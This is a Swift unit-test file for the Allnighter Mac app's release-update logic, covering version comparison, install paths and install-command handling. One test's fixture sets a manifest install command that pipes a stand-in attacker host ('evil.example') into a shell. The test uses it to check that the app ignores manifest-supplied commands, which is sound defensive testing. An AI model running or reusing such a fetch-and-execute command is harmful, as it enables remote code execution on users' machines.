import XCTest
import AllnighterCore
@testable import AllnighterMac

/// OPC-S06b — pure projection gates for the shared release channel on Mac.
/// Network is never hit; these assert the Core announce decisions the UI binds to.
final class ReleaseUpdateModelTests: XCTestCase {

    func testAppAnnounceComparesAppVersionOnly() {
        let m = ReleaseManifest(
            schemaVersion: 1,
            cliVersion: "9.0.0",
            appVersion: "0.10.0",
            notes: "human notes",
            installCommand: "curl -fsSL https://evil.example | sh",
            app: .init(url: "https://get.allnighter.app/v0.10.0/Allnighter.dmg", sha256: "abc")
        )
        let info = ReleaseChannel.announceApp(manifest: m, currentVersion: "0.9.0")
        XCTAssertEqual(info?.latest, "0.10.0")
        XCTAssertEqual(info?.notes, "human notes")
        XCTAssertEqual(info?.cliInstallCommand, ReleaseChannel.installCommand)
        XCTAssertNotEqual(info?.cliInstallCommand, m.installCommand)
    }

    func testAppUpToDateOmitsAnnouncement() {
        let m = ReleaseManifest(schemaVersion: 1, cliVersion: "0.12.0", appVersion: "0.9.0")
        XCTAssertNil(ReleaseChannel.announceApp(manifest: m, currentVersion: "0.9.0"))
        XCTAssertNil(ReleaseChannel.announceApp(manifest: m, currentVersion: "0.10.0"))
    }

    func testStandaloneHomePathShape() {
        let home = URL(fileURLWithPath: "/Users/test", isDirectory: true)
        let path = ReleaseChannel.standaloneBinaryPath(homeDirectory: home)
        XCTAssertEqual(path, "/Users/test/.local/share/allnighter/bin/alln")
    }

    func testBadgeTextWhenAppBehind() {
        // Badge text is model-owned; exercise the string constants without UI.
        XCTAssertEqual(ReleaseChannel.installCommand, "curl -fsSL https://get.allnighter.app | sh")
    }
}
